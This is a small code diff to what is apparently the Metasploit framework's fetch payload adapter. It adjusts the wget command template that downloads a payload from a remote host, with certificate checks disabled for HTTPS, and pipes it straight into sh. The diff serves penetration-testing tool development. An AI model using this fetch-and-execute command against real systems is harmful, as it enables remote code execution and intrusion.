@@ -400,9 +400,9 @@ module Msf::Payload::Adapter::Fetch
   def _generate_wget_pipe
     case fetch_protocol
     when 'HTTPS'
-      return "wget --no-check-certificate -qO - https://#{_download_pipe}|sh"
+      return "wget --no-check-certificate -qO- https://#{_download_pipe}|sh"
     when 'HTTP'
-      return "wget -qO - http://#{_download_pipe}|sh"
+      return "wget -qO- http://#{_download_pipe}|sh"
     else
       fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
     end
